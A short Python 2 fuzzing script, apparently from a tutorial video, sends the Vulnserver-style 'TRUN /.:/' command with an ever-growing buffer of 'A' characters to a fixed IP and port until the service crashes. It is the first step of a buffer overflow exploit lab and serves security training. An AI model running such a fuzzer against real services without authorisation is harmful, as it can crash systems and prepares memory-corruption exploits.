import sys, socket
from time import sleep

# taken from https://www.youtube.com/watch?v=WnN6dbos5u8&t=8567s

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.1', 9999))
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + ("A" * 10)
    except:
        print "fuzzing crashed at %s bytes" % (str(len(buffer)))
        sys.exit()

